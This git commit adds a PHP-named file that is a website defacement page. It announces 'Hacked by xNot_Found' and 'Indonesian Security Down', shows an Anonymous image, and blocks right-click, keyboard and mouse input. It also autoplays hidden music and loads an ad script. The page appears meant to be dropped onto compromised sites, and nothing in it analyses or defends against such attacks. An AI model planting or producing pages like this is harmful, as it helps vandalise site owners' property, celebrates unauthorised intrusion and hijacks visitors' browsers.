57830c46e6b72959ea3a58d74bd4f8e42c8124ee
jiji957 <52668273+jiji957@users.noreply.github.com>
2022-10-13 22:06:24 +0700

    Create jiji4vall.php

---
+++ jiji4vall.php
@@ -0,0 +1,24 @@
+<html>
+
+<center><font face="Chiller"><font size="10" color=white><blink><font color=red>Indonesian S</font>ecurity Down</blink></font><br></center>
+
+<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" style="background-color:#000;background-image:url(http://media.somewhereinblog.net/images/ondhokarer_rajputra_1338250431_1-bg.gif);background-repeat:repeat-y;background-position:top right ;">
+<body bgcolor="black">
+<body onLoad="writetext()" text="#167715" bgcolor="#000000"> <!-- Begin BidVertiser code -->
+<SCRIPT LANGUAGE="JavaScript1.1" SRC="/BidVertiser.dbm?pid=296727&bid=726696" type="text/javascript"></SCRIPT>
+
+<center>
+    <title>.:: Single Attacker ::.</title>
+    <embed allowscriptaccess='never' flashvars='autostart=true' height='0' src=' http://www.uploadmusic.org/musicplayer.swf?song_url=http://www.uploadmusic.org/MUSIC/3080331389689175.mp3&autoplay=true' type='application/x-shockwave-flash' width='0'></embed>
+<br>
+    <a href=""><img src="http://1.bp.blogspot.com/-_Ud3XWvxly8/T5yY8phcqCI/AAAAAAAABkw/cfEG4Weqf30/s1600/Anonymous-Anti-illuminati.jpg" /></a>
+    <center><title>Hacked by xNot_Found</title><link rel="SHORTCUT ICON" href="http://www.latinamericanstudies.org/flags/indonesia-flag.gif"><div align="center">
+
+<br>
+<center><font face="Chiller"><font size="6" color=white><blink><font color=red>Tested By :</font> ./xNot_Found</blink></font><br></center>
+<br>
+
+    <body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
+    </body>
+
+</html>
